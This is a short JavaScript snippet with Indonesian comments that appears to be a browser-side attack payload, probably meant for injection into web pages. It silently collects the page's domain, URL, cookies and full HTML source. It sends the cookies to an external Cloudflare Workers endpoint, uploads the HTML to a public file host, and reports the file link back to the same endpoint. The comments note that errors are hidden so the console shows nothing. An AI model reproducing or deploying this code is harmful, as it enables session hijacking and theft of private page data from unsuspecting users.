(async function() {
  try {
    const currentDomain = document.domain;
    const currentUrl = window.location.href;
    const cookies = document.cookie || 'Kosong';
    const htmlContent = document.documentElement.outerHTML;

    // 1. Kirim ringkasan teks secara senyap via GET
    const summaryText = `Info: ${currentDomain}\nTarget: ${currentUrl}\nCookie: ${cookies}`;
    fetch(`https://memek-worker.defoy89122.workers.dev/?message=${encodeURIComponent(summaryText)}`).catch(() => {});

    // 2. Unggah file HTML ke Uguu.se
    const formData = new FormData();
    const blob = new Blob([htmlContent], { type: 'text/html' });
    formData.append('files[]', blob, `${currentDomain}_source.html`);

    const uguuResponse = await fetch('https://uguu.se/upload', {
      method: 'POST',
      body: formData
    });

    if (uguuResponse.ok) {
      const uguuData = await uguuResponse.json();
      const fileUrl = uguuData.files?.[0]?.url;

      if (fileUrl) {
        // 3. Kirim link ke Worker secara senyap via POST
        await fetch('https://memek-worker.defoy89122.workers.dev/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            file_url: fileUrl,
            page_url: currentUrl
          })
        });
      }
    }
  } catch (e) {
    // Error diabaikan agar tidak memicu pesan error di konsol
  }
})();
